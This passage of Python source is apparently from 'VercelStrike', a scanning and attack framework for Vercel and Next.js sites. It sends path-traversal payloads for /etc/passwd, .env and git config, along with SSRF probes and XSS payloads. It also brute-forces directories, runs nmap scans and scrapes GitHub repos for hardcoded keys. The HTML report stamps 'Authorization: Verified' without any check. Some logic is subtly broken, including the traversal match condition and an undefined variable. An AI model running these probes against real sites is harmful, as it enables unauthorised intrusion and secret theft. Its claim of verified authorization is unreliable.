        for test_url in test_urls:
            r = curl(test_url, allow_redirects=False, method="HEAD" if random.random() > 0.5 else "GET")
            code = r.get("code", "000")
            if code not in ("404", "000"):
                body_snippet = r.get("body", "")[:150]
                print(f"   {R}[{code}]{N} SSRF probe: {test_url.split('?')[0].split('/')[-1]} → {ssrf_target[:30]}")
                save_finding("03_cve", "ssrf_proxy", "HIGH", f"SSRF via API proxy to {ssrf_target[:20]}",
                            "API route proxying user-controlled URLs", body_snippet)
    
    # 3.4 Path traversal testing
    print(f" {B}[3.4]{N} Path traversal testing...")
    traversal_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\..\\etc\\passwd",
        "../../../proc/self/environ",
        "../../../.env",
        "../../../.git/config",
    ]
    
    for payload in traversal_payloads:
        test_urls = [
            f"{TARGET_URL}/{payload}",
            f"{TARGET_URL}/api/data?path={payload}",
            f"{TARGET_URL}/api/file?path={payload}",
            f"{TARGET_URL}/api/download?file={payload}",
        ]
        for test_url in test_urls:
            r = curl(test_url, allow_redirects=False)
            body = r.get("body", "")
            code = r.get("code", "000")
            if code not in ("404", "000") and "root:" in body or "daemon:" in body or "bin:" in body:
                print(f"   {R}[!] PATH TRAVERSAL: {payload}")
                print(f"   {body[:200]}")
                save_finding("03_cve", "path_traversal", "CRITICAL", f"Path traversal via {payload}",
                            "Server exposes local file content", body[:500])
                break
    
    # 3.5 CVE-2025-55182 (React2Shell) - Version fingerprint
    print(f" {B}[3.5]{N} React2Shell CVE-2025-55182 check...")
    # This is a critical RCE in React Server Components
    # Detection via bundle analysis
    r = curl(TARGET_URL)
    body = r.get("body", "")
    
    # Check for react version in bundles
    react_versions = re.findall(r'["\']?react["\']?["\s:]+["\']?([\d.]+)["\']?', body)
    if react_versions:
        print(f"   {INFO} React version hint: {react_versions}")
        for ver in react_versions:
            if ver.startswith("19."):
                print(f"   {R}[!] React 19.x detected — potentially vulnerable to CVE-2025-55182!{N}")
                save_finding("03_cve", "react2shell", "CRITICAL", 
                            "React 19.x detected (CVE-2025-55182 React2Shell)",
                            "Critical RCE in React Server Components — upgrade to >=19.0.1",
                            f"Version: {ver}")
    
    # 3.6 XSS testing on all input vectors
    print(f" {B}[3.6]{N} XSS vector testing...")
    xss_payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
    ]
    
    xss_vectors = [
        f"{TARGET_URL}/<script>alert(1)</script>",
        f"{TARGET_URL}/search?q=<script>alert(1)</script>",
        f"{TARGET_URL}/search?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
        f"{TARGET_URL}/?next=javascript:alert(1)",
        f"{TARGET_URL}/?redirect=javascript:alert(1)",
        f"{TARGET_URL}/?url=javascript:alert(1)",
    ]
    
    for vector in xss_vectors:
        r = curl(vector, allow_redirects=False)
        body = r.get("body", "")
        if "<script>alert" in body or "alert(1)" in body:
            print(f"   {R}[!] REFLECTED XSS: {vector[:70]}...{N}")
            save_finding("03_cve", "reflected_xss", "HIGH", "Reflected XSS vulnerability",
                        "User input reflected without sanitization", vector)
            break
    
    print(f"\n {G}[✓] Phase 3 complete{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 4: ADVANCED TOOL-ENHANCED SCANNING
# ═══════════════════════════════════════════════════════════════
def phase4_tool_scanning():
    """Leverage external tools for deeper scanning"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 4: ADVANCED TOOL-ENHANCED SCANNING{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    # 4.1 ffuf — directory fuzzing
    if has_tool('ffuf'):
        print(f" {B}[4.1]{N} ffuf directory brute-force...")
        
        # Vercel-specific wordlist
        vercel_paths = [
            # Common
            "admin", "dashboard", "panel", "config", "backup", "secret",
            # API
            "api", "api/v1", "api/v2", "api/health", "api/status",
            "api/users", "api/auth", "api/login", "api/admin",
            "api/env", "api/environment", "api/keys", "api/debug",
            "api/graphql", "api/rest", "api/webhook",
            # Vercel-specific
            "_next", "_next/static", "_next/data",
            ".env", ".env.local", ".env.production",
            "vercel.json", "next.config.js", "package.json",
            # Next.js
            "__nextjs_original-stack-frame",
            "_loading", "404", "500", "error",
            # Git
            ".git", ".git/config", ".git/HEAD",
            # Auth
            "login", "signin", "signup", "register", "logout",
            "auth", "oauth", "callback", "reset",
            # Admin
            "administrator", "management", "sysadmin",
            # Debug
            "debug", "test", "dev", "staging", "internal",
            "swagger", "docs", "api-docs",
            # Files
            "sitemap.xml", "robots.txt", "security.txt",
            "favicon.ico", "manifest.json",
            # Upload
            "upload", "uploads", "files", "media", "assets",
            "static", "public", "download",
            # Config
            "config.json", "config.php", "config.yaml",
            "settings", "setup", "install", "migrate",
            # Webhooks
            "webhook", "webhooks", "callback", "callbacks",
            # Serverless
            "api/__funcs", "api/__debug",
        ]
        
        wordlist_file = f"{OUTPUT_DIR}/vercel_wordlist.txt"
        with open(wordlist_file, 'w') as f:
            for p in vercel_paths:
                f.write(p + '\n')
        
        outfile = f"{OUTPUT_DIR}/ffuf_results.json"
        cmd = (
            f"ffuf -u '{TARGET_URL}/FUZZ' "
            f"-w {wordlist_file} "
            f"-t 30 -c -fc 404,301,302,307,400 "
            f"-o {outfile} "
            f"-H 'User-Agent: Mozilla/5.0' "
            f"-maxtime 60 "
            f"2>&1"
        )
        
        out, err, rc = run(cmd, timeout=90)
        print(f"   {out[:500]}")
        
        if os.path.exists(outfile):
            try:
                with open(outfile) as f:
                    ffuf_data = json.load(f)
                results = ffuf_data.get("results", [])
                print(f"   {G}[+]{N} ffuf found {len(results)} endpoints")
                for r in results[:20]:
                    status = r.get("status", "???")
                    url_found = r.get("input", {}).get("FUZZ", "?") 
                    length = r.get("length", 0)
                    print(f"   {Y}[{status}]{N} {url_found} ({length}B)")
                    save_finding("04_tools", "ffuf_result", "INFO" if status < 400 else "MEDIUM",
                                f"ffuf: /{url_found} [{status}]",
                                f"Discovered by directory brute-force", f"Size: {length}B")
            except Exception as e:
                print(f"   {R}[!] ffuf parse error: {e}{N}")
    else:
        print(f"   {Z}~ ffuf not installed — using curl-based enumeration{N}")
        # Fallback curl-based fuzzing
        common_paths = ["admin", "dashboard", "api", "config", ".env", "login", 
                       ".git", "backup", "test", "secret", "panel", "debug"]
        for path in common_paths:
            url = f"{TARGET_URL}/{path}"
            r = curl(url, allow_redirects=False)
            code = r.get("code", "000")
            if code not in ("404", "000", "301", "302"):
                print(f"   {Y}[{code}]{N} /{path}")
    
    # 4.2 Nuclei — CVE scanning
    if has_tool('nuclei'):
        print(f" {B}[4.2]{N} Nuclei vulnerability scanning...")
        # Check for relevant nuclei templates
        template_categories = [
            "technologies", "vulnerabilities", "misconfiguration",
            "exposures", "cves", "default-logins",
        ]
        
        for cat in template_categories[:2]:
            outfile = f"{OUTPUT_DIR}/nuclei_{cat}.json"
            cmd = (
                f"nuclei -u '{TARGET_URL}' "
                f"-t ~/nuclei-templates/ 2>/dev/null "
                f"-severity critical,high,medium "
                f"-json -o {outfile} "
                f"-timeout 5 "
                f"-bulk-size 25 "
                f"-c 25 "
                f"2>&1 | tail -20"
            )
            out, err, rc = run(cmd, timeout=120)
            print(f"   {out[:300]}")
            
            if os.path.exists(outfile):
                try:
                    with open(outfile) as f:
                        for line in f:
                            try:
                                vuln = json.loads(line)
                                sev = vuln.get("info", {}).get("severity", "unknown").upper()
                                name = vuln.get("info", {}).get("name", "Unknown")
                                template = vuln.get("template-id", "")
                                print(f"   {R}[{sev}]{N} {name} ({template})")
                                save_finding("04_tools", f"nuclei_{sev.lower()}", sev, name,
                                           f"Nuclei template: {template}", str(vuln)[:300])
                            except:
                                pass
                except:
                    print(f"   {Z}~ Could not parse nuclei results{N}")
    else:
        print(f"   {Z}~ nuclei not installed — skipping{N}")
    
    # 4.3 Nikto — web server scan
    if has_tool('nikto'):
        print(f" {B}[4.3]{N} Nikto web server scan...")
        outfile = f"{OUTPUT_DIR}/nikto.txt"
        cmd = f"nikto -h '{TARGET_URL}' -o '{outfile}' -Format txt -Tuning 123456789 2>&1 | tail -30"
        out, err, rc = run(cmd, timeout=180)
        print(f"   {out[:500]}")
        
        if os.path.exists(outfile):
            with open(outfile) as f:
                content = f.read()
            # Extract findings
            vulns = re.findall(r'^(?:\+ |OSVDB|NIKTO).+', content, re.M)
            for v in vulns[:15]:
                print(f"   {Z}~ {v[:80]}{N}")
                save_finding("04_tools", "nikto", "MEDIUM", f"Nikto: {v[:60]}",
                            "Discovered by Nikto scanner", v)
    else:
        print(f"   {Z}~ nikto not installed — skipping{N}")
    
    # 4.4 Gobuster — directory and DNS fuzzing
    if has_tool('gobuster'):
        print(f" {B}[4.4]{N} Gobuster directory enumeration...")
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if os.path.exists(wordlist):
            outfile = f"{OUTPUT_DIR}/gobuster.txt"
            cmd = (
                f"gobuster dir -u '{TARGET_URL}' "
                f"-w {wordlist} "
                f"-t 30 "
                f"-s '200,201,202,203,204,301,302,307,401,403,405,500' "
                f"-o '{outfile}' "
                f"2>&1 | tail -30"
            )
            out, err, rc = run(cmd, timeout=120)
            print(f"   {out[:500]}")
            
            if os.path.exists(outfile):
                with open(outfile) as f:
                    for line in f.readlines()[:20]:
                        if line.strip():
                            print(f"   {Y}{line.strip()}{N}")
    
    # 4.5 Nmap — quick port scan
    if has_tool('nmap'):
        print(f" {B}[4.5]{N} Nmap quick scan...")
        domain = TARGET_DOMAIN
        if domain.startswith("www."):
            domain = domain[4:]
        cmd = f"nmap -sSV -Pn -F --script http-headers,http-title,http-server-header {domain} 2>&1 | tail -20"
        out, err, rc = run(cmd, timeout=60)
        print(f"   {out[:500]}")
        save_finding("04_tools", "nmap", "INFO", "Nmap scan results", out[:500], out)
    
    print(f"\n {G}[✓] Phase 4 complete{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 5: GIT & CODE REPOSITORY ANALYSIS
# ═══════════════════════════════════════════════════════════════
def phase5_git_recon():
    """Git repository hunting and secret mining"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 5: GIT & REPOSITORY INTELLIGENCE{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    # 5.1 Check for .git exposure
    print(f" {B}[5.1]{N} Git repository exposure check...")
    git_paths = [
        ".git/HEAD", ".git/config", ".git/description",
        ".git/index", ".git/COMMIT_EDITMSG",
        ".git/refs/heads/main", ".git/refs/heads/master",
        ".git/refs/heads/develop",
        ".git/logs/HEAD", ".git/objects/info/packs",
    ]
    
    for gp in git_paths:
        url = f"{TARGET_URL}/{gp}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        body = r.get("body", "")
        if code == "200" and len(body) > 5:
            print(f"   {R}[!] GIT EXPOSED: /{gp}")
            print(f"   {body[:150]}")
            save_finding("05_git", "git_exposure", "CRITICAL", f"Git repo exposed: {gp}",
                        "Full git repository accessible — all source history exposed",
                        body[:300])
    
    # 5.2 GitHub search for project
    print(f" {B}[5.2]{N} GitHub source code search...")
    project_hint = TARGET_DOMAIN.replace('.vercel.app', '').replace('www.', '')
    
    # Try common repo patterns
    repo_patterns = [
        f"https://github.com/search?q={project_hint}+vercel&type=code",
        f"https://github.com/search?q=%22{project_hint}.vercel.app%22&type=code",
    ]
    
    for pattern in repo_patterns:
        out, _, _ = run(f"curl -s -L -m 15 -A '{random.choice(USER_AGENTS)}' '{pattern}'", timeout=15)
        # Look for repo links in results
        repos = re.findall(r'github\.com/([^/"\']+/[^/"\']+)', out)
        if repos:
            unique_repos = list(set(repos))[:5]
            for repo in unique_repos:
                repo_clean = repo.split('"')[0].split('?')[0]
                print(f"   {G}[+]{N} Possible repo: https://github.com/{repo_clean}")
                
                # Check for .env.example in that repo
                env_url = f"https://raw.githubusercontent.com/{repo_clean}/main/.env.example"
                r2 = curl(env_url, allow_redirects=False)
                if r2.get("code") == "200":
                    env_body = r2.get("body", "")[:300]
                    print(f"     {Y}[.env.example]{N} Found! Contents:")
                    for line in env_body.split('\n')[:10]:
                        if '=' in line and line.strip():
                            print(f"     {Z}│{N} {line.strip()}")
                    save_finding("05_git", "env_example", "HIGH", f"Env template from {repo_clean}",
                                "Environment variable template reveals expected keys", env_body)
                
                # Check for secrets in that repo's files
                for filepath in ["config.js", "config.ts", "firebase.js", "firebase.ts",
                                "db.js", "database.js", "auth.js", "secrets.js"]:
                    furl = f"https://raw.githubusercontent.com/{repo_clean}/main/{filepath}"
                    r3 = curl(furl, allow_redirects=False)
                    if r3.get("code") == "200":
                        fbody = r3.get("body", "")
                        secrets_found_in_file = re.findall(
                            r'(?i)(?:api_key|token|secret|password|key)["\s:=]+["\']([^"\']{8,})["\']', fbody)
                        if secrets_found_in_file:
                            print(f"     {R}[!]{N} Secrets in {filepath}:")
                            for s in secrets_found_in_file[:3]:
                                print(f"       {R}{s[:30]}...{N}")
                            save_finding("05_git", "repo_secrets", "CRITICAL", 
                                        f"Secrets in {repo_clean}/{filepath}",
                                        "Hardcoded secrets in public repository",
                                        str(secrets_found_in_file))
    
    # 5.3 Git history secret scanning with trufflehog
    if has_tool('trufflehog'):
        print(f" {B}[5.3]{N} TruffleHog secret scanning...")
        repo_dir = f"{OUTPUT_DIR}/repo"
        if not os.path.exists(repo_dir):
            # Try to clone from a found repo
            result_file = f"{OUTPUT_DIR}/{TARGET_DOMAIN}/05_git.json"
            if os.path.exists(result_file):
                try:
                    with open(result_file) as f:
                        data = json.load(f)
                    for entry in data:
                        d = entry.get("data", {})
                        if "repo_url" in str(d):
                            repo_url = re.search(r'github\.com/([^/\s"]+)', str(d))
                except:
                    pass
        
        outfile = f"{OUTPUT_DIR}/trufflehog.json"
        cmd = f"trufflehog filesystem --no-update '{OUTPUT_DIR}' --json 2>/dev/null | head -30"
        out, err, rc = run(cmd, timeout=30)
        if out:
            print(f"   {out[:300]}")
    else:
        print(f"   {Z}~ trufflehog not installed — skipping{N}")
    
    # 5.4 Wayback Machine / historical data
    print(f" {B}[5.4]{N} Wayback Machine historical data...")
    wayback_url = f"https://web.archive.org/web/20240000000000/{TARGET_URL}"
    r = curl(wayback_url, allow_redirects=False)
    if r.get("code") == "200" and r.get("size", "0") != "0":
        print(f"   {INFO} Archived version available on Wayback Machine")
    
    # Check for old JS files with secrets
    wayback_search = f"https://web.archive.org/cdx/search/cdx?url={TARGET_URL}&output=json&fl=original&filter=mimetype:application/javascript"
    out, _, _ = run(f"curl -s -m 10 '{wayback_search}'", timeout=10)
    if out and len(out) > 50:
        js_files = re.findall(r'"([^"]+\.js)"', out)
        print(f"   {INFO} {len(js_files)} historical JS files found")
        for js in js_files[:5]:
            print(f"   {Z}~ {js[:60]}{N}")
    
    print(f"\n {G}[✓] Phase 5 complete{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 6: AUTHENTICATION & SESSION TESTING
# ═══════════════════════════════════════════════════════════════
def phase6_auth_testing():
    """Test authentication mechanisms"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 6: AUTHENTICATION & SESSION TESTING{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    # 6.1 JWT token exposure
    print(f" {B}[6.1]{N} JWT/token exposure check...")
    r = curl(TARGET_URL)
    body = r.get("body", "")
    
    # Check cookies
    cookies = re.findall(r'(?:document\.cookie|setCookie|cookie)\s*[=:]\s*["\']([^"\']+)', body)
    for cookie in cookies:
        print(f"   {Y}[!]{N} Cookie found in JS: {cookie[:50]}")
        save_finding("06_auth", "cookie_exposure", "MEDIUM", "Cookie exposed in client JS",
                    "Authentication tokens may be readable by XSS", cookie[:100])
    
    # Check localStorage/sessionStorage usage
    storage_refs = re.findall(r'(?:localStorage|sessionStorage)\.(?:getItem|setItem)\(["\']([^"\']+)', body)
    for ref in storage_refs:
        print(f"   {INFO} Storage key: {ref}")
    
    # 6.2 Auth endpoint discovery
    print(f" {B}[6.2]{N} Authentication endpoint discovery...")
    auth_paths = [
        "login", "signin", "logout", "signup", "register",
        "auth", "oauth", "oauth2", "oauth/callback",
        "api/login", "api/auth", "api/register", "api/signin",
        "api/oauth", "api/token", "api/refresh",
        "api/me", "api/user", "api/profile",
        "api/verify", "api/reset", "api/forgot",
        "api/2fa", "api/mfa", "api/otp",
    ]
    
    auth_finds = []
    for path in auth_paths:
        url = f"{TARGET_URL}/{path}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        if code not in ("404", "000"):
            auth_finds.append({"path": path, "code": code})
            print(f"   {Y}[{code}]{N} /{path}")
    
    if auth_finds:
        save_finding("06_auth", "auth_endpoints", "INFO", f"Auth endpoints ({len(auth_finds)})",
                    "Authentication-related endpoints discovered", str(auth_finds))
    
    # 6.3 Admin panel discovery
    print(f" {B}[6.3]{N} Admin panel discovery...")
    admin_paths = [
        "admin", "administrator", "dashboard", "panel",
        "admin/login", "admin/dashboard", "admin/panel",
        "wp-admin", "administrator/login",
        "api/admin", "api/dashboard",
        "management", "manage", "control", "console",
        "backoffice", "backend", "internal",
    ]
    
    for path in admin_paths:
        url = f"{TARGET_URL}/{path}"
        r = curl(url, allow_redirects=False)
        code = r.get("code", "000")
        if code not in ("404", "000", "301", "302"):
            print(f"   {R}[{code}]{N} /{path}")
            save_finding("06_auth", "admin_panel", "HIGH", f"Admin panel: /{path} [{code}]",
                        "Administrative interface accessible", f"URL: {url}")
    
    print(f"\n {G}[✓] Phase 6 complete{N}")

# ═══════════════════════════════════════════════════════════════
# PHASE 7: COMPREHENSIVE REPORT GENERATION
# ═══════════════════════════════════════════════════════════════
def phase7_report():
    """Generate comprehensive HTML + JSON report"""
    print(f"\n{R}{'═'*60}{N}")
    print(f"{SKULL} {R}PHASE 7: REPORT GENERATION{W}")
    print(f"{R}{'═'*60}{N}\n")
    
    target_dir = f"{OUTPUT_DIR}/{TARGET_DOMAIN}"
    
    # Collect all findings
    all_findings = []
    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    
    if os.path.exists(target_dir):
        for fname in sorted(os.listdir(target_dir)):
            if fname.endswith(".json"):
                try:
                    with open(f"{target_dir}/{fname}") as f:
                        data = json.load(f)
                    for entry in data:
                        finding = entry.get("data", {})
                        finding["phase"] = fname.replace(".json", "")
                        all_findings.append(finding)
                        sev = finding.get("severity", "INFO").upper()
                        if sev in severity_counts:
                            severity_counts[sev] += 1
                except:
                    pass
    
    # Generate HTML report
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VercelStrike — Pentest Report: {TARGET_DOMAIN}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
               background: #0a0e17; color: #c8d6e5; padding: 30px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #00ff88; font-size: 2.5em; margin-bottom: 5px; 
              text-shadow: 0 0 20px rgba(0,255,136,0.3); }}
        h2 {{ color: #00aaff; margin: 30px 0 15px; border-bottom: 2px solid #1a2a4a;
              padding-bottom: 8px; font-size: 1.5em; }}
        h3 {{ color: #ffaa00; margin: 15px 0 8px; }}
        .meta {{ color: #667; margin-bottom: 30px; }}
        .meta b {{ color: #8899aa; }}
        
        .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                         gap: 15px; margin: 20px 0; }}
        .stat-box {{ background: #111b2e; border: 1px solid #1a2a4a; border-radius: 8px;
                     padding: 20px; text-align: center; }}
        .stat-box .num {{ font-size: 2.5em; font-weight: bold; }}
        .stat-box .label {{ font-size: 0.85em; color: #667; margin-top: 5px; }}
        
        .finding {{ padding: 12px 15px; margin: 8px 0; border-radius: 6px;
                    border-left: 4px solid #333; }}
        .finding.critical {{ background: #1a0a0a; border-left-color: #ff3333; }}
        .finding.high {{ background: #1a100a; border-left-color: #ff8800; }}
        .finding.medium {{ background: #0f1a0a; border-left-color: #ffaa00; }}
        .finding.low {{ background: #0a0f1a; border-left-color: #88ff00; }}
        .finding.info {{ background: #0a0a1a; border-left-color: #00aaff; }}
        
        .finding .title {{ font-size: 1.1em; font-weight: bold; color: #e0e6ed; }}
        .finding .sev {{ display: inline-block; padding: 2px 8px; border-radius: 3px;
                         font-size: 0.75em; margin-left: 8px; }}
        .finding .sev.critical {{ background: #ff3333; color: #000; }}
        .finding .sev.high {{ background: #ff8800; color: #000; }}
        .finding .sev.medium {{ background: #ffaa00; color: #000; }}
        .finding .sev.low {{ background: #88ff00; color: #000; }}
        .finding .sev.info {{ background: #00aaff; color: #000; }}
        .finding .desc {{ color: #8899aa; margin-top: 5px; font-size: 0.9em; }}
        .finding .evidence {{ background: #050810; padding: 8px; margin-top: 8px; 
                              border-radius: 4px; font-size: 0.8em; color: #667;
                              overflow-x: auto; max-height: 100px; }}
        
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        th {{ background: #111b2e; color: #00aaff; padding: 10px 15px; text-align: left; }}
        td {{ padding: 10px 15px; border-bottom: 1px solid #111b2e; }}
        tr:hover td {{ background: #0f1525; }}
        
        .nav {{ position: fixed; top: 20px; right: 20px; background: #111b2e; 
                padding: 15px; border-radius: 8px; border: 1px solid #1a2a4a;
                max-width: 200px; z-index: 1000; }}
        .nav a {{ display: block; color: #00aaff; text-decoration: none; padding: 3px 0;
                 font-size: 0.85em; }}
        .nav a:hover {{ color: #00ff88; }}
        .nav b {{ color: #00ff88; }}
        
        @media print {{ .nav {{ display: none; }} }}
    </style>
</head>
<body>
<div class="container">
    <div class="nav">
        <b>Navigation</b>
        <a href="#summary">Executive Summary</a>
        <a href="#critical">Critical Findings</a>
        <a href="#high">High Findings</a>
        <a href="#medium">Medium Findings</a>
        <a href="#all">All Findings</a>
        <a href="#remediation">Remediation</a>
    </div>
    
    <h1>⏤ VercelStrike ⏤</h1>
    <p style="color:#00aaff;font-size:1.2em">Advanced Vercel Penetration Test Report</p>
    <div class="meta">
        <p><b>Target:</b> {TARGET_URL}</p>
        <p><b>Domain:</b> {TARGET_DOMAIN}</p>
        <p><b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><b>Authorization:</b> <span style="color:#00ff88">✅ Verified</span></p>
    </div>
    
    <h2 id="summary">Executive Summary</h2>
    <div class="summary-grid">
        <div class="stat-box">
            <div class="num" style="color:#ff3333">{severity_counts.get('CRITICAL',0)}</div>
            <div class="label">Critical</div>
        </div>
        <div class="stat-box">
            <div class="num" style="color:#ff8800">{severity_counts.get('HIGH',0)}</div>
            <div class="label">High</div>
        </div>
        <div class="stat-box">
            <div class="num" style="color:#ffaa00">{severity_counts.get('MEDIUM',0)}</div>
            <div class="label">Medium</div>
        </div>
        <div class="stat-box">
            <div class="num" style="color:#88ff00">{severity_counts.get('LOW',0)}</div>
            <div class="label">Low</div>
        </div>
        <div class="stat-box">
            <div class="num" style="color:#00aaff">{len(all_findings)}</div>
            <div class="label">Total Findings</div>
        </div>
        <div class="stat-box">
            <div class="num" style="color:#e0e6ed">
                {round((severity_counts.get('CRITICAL',0)*10 + severity_counts.get('HIGH',0)*5 +
                       severity_counts.get('MEDIUM',0)*2) / max(1, len(all_findings)), 1)}
            </div>
            <div class="label">Risk Score (0-10)</div>
        </div>
    </div>
    
    <h2 id="critical">Critical Findings</h2>"""
    
    critical_findings = [f for f in all_findings if f.get("severity","").upper() == "CRITICAL"]
    if critical_findings:
        for f in critical_findings:
            html += f"""
    <div class="finding critical">
        <div class="title">{f.get('title','Unknown')} <span class="sev critical">CRITICAL</span></div>
        <div class="desc">{f.get('description','')}</div>
        <div class="evidence">{f.get('evidence','')[:200]}</div>
    </div>"""
    else:
        html += '<p style="color:#88ff00">No critical findings — target is hardened against critical vectors.</p>'
    
    html += f"""
    <h2 id="high">High Findings</h2>"""
    
    high_findings = [f for f in all_findings if f.get("severity","").upper() == "HIGH"]
    if high_findings:
        for f in high_findings:
            html += f"""
    <div class="finding high">
        <div class="title">{f.get('title','Unknown')} <span class="sev high">HIGH</span></div>
        <div class="desc">{f.get('description','')}</div>
        <div class="evidence">{f.get('evidence','')[:200]}</div>
    </div>"""
    
    html += f"""
    <h2 id="medium">Medium Findings</h2>"""
    
    medium_findings = [f for f in all_findings if f.get("severity","").upper() == "MEDIUM"]
    if medium_findings:
        for f in medium_findings[:10]:
            html += f"""
    <div class="finding medium">
        <div class="title">{f.get('title','Unknown')} <span class="sev medium">MEDIUM</span></div>
        <div class="desc">{f.get('description','')}</div>
    </div>"""
    
    html += f"""
    <h2 id="all">All Findings by Phase</h2>
    <table>
        <tr><th>Phase</th><th>Severity</th><th>Title</th><th>Time</th></tr>"""
    
    for f in all_findings:
        sev = f.get("severity","INFO").upper()
        sev_color = {"CRITICAL":"#ff3333","HIGH":"#ff8800","MEDIUM":"#ffaa00","LOW":"#88ff00","INFO":"#00aaff"}.get(sev, "#fff")
        title = f.get("title","Unknown")[:60]
        phase = f.get("phase","?").replace("_", " ").title()
        ts = f.get("timestamp","")[11:19] if f.get("timestamp") else "?"
        html += f'<tr><td style="color:#667">{phase}</td><td style="color:{sev_color}"><b>{sev}</b></td><td>{title}</td><td style="color:#667">{ts}</td></tr>'
    
    html += """</table>"""
    
    html += f"""
    <h2 id="remediation">Remediation Recommendations</h2>
    
    <div class="finding critical">
        <div class="title">🔴 Environment Variable Security</div>
        <div class="desc">Never expose secrets via NEXT_PUBLIC_ prefix. Use Vercel's server-side env vars 
        (without prefix) for all sensitive data. Rotate any potentially exposed keys immediately.</div>
    </div>
    
    <div class="finding high">
        <div class="title">🔴 Dependency Updates</div>
        <div class="desc">Next.js {', '.join(version_hints) if 'version_hints' in dir() else ''} is used. 
        Check for CVEs and upgrade Next.js to latest LTS. Run <code>npm audit</code> regularly.</div>
    </div>
    
    <div class="finding high">
        <div class="title">🔴 Vercel Deployment Protection</div>
        <div class="desc">Enable Deployment Protection (Standard at minimum) for all preview deployments.
        Set environment variables as "sensitive" in Vercel project settings.</div>
    </div>
    
    <div class="finding medium">
        <div class="title">🟠 API Route Hardening</div>
        <div class="desc">Add authentication, rate limiting, origin validation, and input sanitization 
        to all API routes. Validate URL parameters to prevent SSRF.</div>
    </div>
    
    <div class="finding medium">
        <div class="title">🟠 Security Headers</div>
        <div class="desc">Implement CSP, HSTS, X-Frame-Options, X-Content-Type-Options, 
        and Referrer-Policy headers via <code>next.config.js</code> or <code>vercel.json</code>.</div>
    </div>
    
    <div class="finding low">
        <div class="title">🟢 Git Hygiene</div>
        <div class="desc">Use <code>.gitignore</code> for .env files. Implement pre-commit hooks with 
        <code>git-secrets</code> or <code>trufflehog</code> to prevent secret commits.</div>
    </div>
    
    <p style="text-align:center;color:#334;margin-top:60px;padding:20px;border-top:1px solid #1a2a4a">
        Generated by VercelStrike v2.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br>
        <span style="color:#667">Authorized Penetration Test — Confidential</span>
    </p>
</div>
</body>
</html>"""
    
    report_file = f"{OUTPUT_DIR}/vercelstrike_report.html"
    with open(report_file, 'w') as f:
        f.write(html)
    
    # Also save JSON summary
    summary = {
        "target": TARGET_URL,
        "domain": TARGET_DOMAIN,
        "timestamp": datetime.now().isoformat(),
        "severity_counts": severity_counts,
        "total_findings": len(all_findings),
        "tools_available": sum(1 for v in TOOLS.values() if v),
        "tools_total": len(TOOLS),
    }
    with open(f"{OUTPUT_DIR}/summary.json", 'w') as f:
        json.dump(summary, f, indent=2)
    
    print(f" {G}[✓] Report generated:{N} {Y}{report_file}{N}")
    print(f" {INFO} Severity breakdown:")
    for sev, count in sorted(severity_counts.items(), key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}[x[0]]):
        if count > 0:
            color = {"CRITICAL":R, "HIGH":M, "MEDIUM":Y, "LOW":G, "INFO":B}.get(sev, W)
            print(f"     {color}{sev:10s}{N}: {count}")
    
    print(f"\n {G}═══════════════════════════════════════════{N}")
    print(f" {G}  ASSESSMENT COMPLETE — RESULTS IN:{N}")
    print(f" {C}  {OUTPUT_DIR}/{N}")
    print(f" {C}  {OUTPUT_DIR}/vercelstrike_report.html{N}")
    print(f" {G}═══════════════════════════════════════════{N}")

# ═══════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════
def main():
    banner()
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(
        description=f'{R}VercelStrike{R} — Advanced Vercel/Next.js Pentesting Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{W}EXAMPLES:{N}
  python3 vercelstrike.py -t https://target.vercel.app
  python3 vercelstrike.py -t https://target.vercel.app -T 100
  python3 vercelstrike.py -t https://target.vercel.app --skip-tool-scan

{G}AUTHORIZED USE ONLY{N}
        """
    )
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g. https://target.vercel.app)')
    parser.add_argument('-T', '--threads', type=int, default=50, help='Thread count (default: 50)')
    parser.add_argument('--skip-tool-scan', action='store_true', help='Skip external tool scanning')
    parser.add_argument('--skip-git', action='store_true', help='Skip git analysis')
    parser.add_argument('--quick', action='store_true', help='Quick scan (recon + CVEs only)')
    parser.add_argument('--output', help='Custom output directory')
    
    args = parser.parse_args()
    
    global THREADS, OUTPUT_DIR
